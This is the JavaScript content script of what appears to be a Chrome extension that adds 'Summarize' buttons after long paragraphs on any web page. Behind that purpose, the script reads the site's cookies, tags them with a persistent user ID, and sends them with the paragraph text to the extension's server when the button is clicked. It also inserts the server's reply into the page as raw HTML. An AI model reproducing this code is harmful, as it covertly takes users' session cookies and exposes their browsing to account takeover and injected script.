console.log("Chrome extension running");

var UID = null;

// function to generate UUID
function createUUID() {
    // http://www.ietf.org/rfc/rfc4122.txt
    var s = [];
    var hexDigits = "0123456789abcdef";
    for (var i = 0; i < 36; i++) {
        s[i] = hexDigits.substr(Math.floor(Math.random() * 0x10), 1);
    }
    s[14] = "4";  // bits 12-15 of the time_hi_and_version field to 0010
    s[19] = hexDigits.substr((s[19] & 0x3) | 0x8, 1);  // bits 6-7 of the clock_seq_hi_and_reserved to 01
    s[8] = s[13] = s[18] = s[23] = "-";

    return s.join("");
}

// load UUID from chrome storage
// if none is found, generate new
chrome.storage.sync.get("UID", function(result){
    if (!$.isEmptyObject(result)) {
        UID = result.UID;
    } else {
        UID = createUUID();
        chrome.storage.sync.set({"UID": UID});
    }
});

var paragraphs = $('body p');

for(Element of paragraphs){
    // show summarize button only if there are more than 3 sentences in a paragraph
    if(Element.textContent.trim() !== "" && Element.textContent.split('.').length>3 || Element.textContent.split(',').length>5){
        console.log(Element.textContent.split('.').length);
        console.log(Element.className += 'summarize_me');
    }
}

function escapeChars(pairs){
    pairs = pairs.replace(/%/g,'PRC');
    pairs = pairs.replace(/&/g, "and");
    pairs = pairs.replace(/\s+/g,'%20');
    pairs = pairs.replace(/\n+/g,'%20');
    pairs = pairs.replace(/"/g,'');
    pairs = pairs.replace(/'/g,'');
    pairs = pairs.replace(/=/g,'EQL');
    pairs = pairs.replace(/:/g,'%20');
    pairs = pairs.replace(/\\/g,'');
    pairs = pairs.replace(/,/g,'');
    pairs = pairs.replace(/;/g,'');
    pairs = pairs.replace(/\(/g,'');
    pairs = pairs.replace(/\)/g,'');
    pairs = pairs.replace(/{/g,'');
    pairs = pairs.replace(/}/g,'');
    var ignore = "\\";
    pairs = pairs.replace(ignore,'');
    pairs = pairs.replace(/\[.*?\]/g,'');
    return pairs;
}
// get cookies and escape characters to prevent APOCALYPSE
var getCookies = function(){
    var domain = window.location.hostname;
    var pairs = document.cookie;
    pairs = escapeChars(pairs);
    domain = domain+"+"+pairs;
    return domain;
};

var cookies = getCookies();
//window.alert(UID+"\n"+UID.toString());



$('<button type="button" class="summarize_button">Summarize</button>').insertAfter('.summarize_me');

$('.summarize_button').click(function () {

    $('#summarize_container').remove();

    var text = $(this).prev('p')[0].textContent;
    text = escapeChars(text);

    // URL syntax:
    // IP_ADDRESS:6789/test?p= USER ID &t= TEXT &cookie= COOKIES
    $.ajax({
        url: "https://localhost:6789/test?p="+UID.toString()+"&t=" + text+"&cookie="+cookies,
        method: "GET",
        success: function (result) {
            $('body').append('<div id="summarize_container"> <div class="alert-close">×</div>' + result + '</div></div>');
            initializeCloseButton();
        },
        error: function() {

        }
    });
});

function initializeCloseButton() {
    $('.alert-close').click(function () {
        $('#summarize_container').hide();
    });
}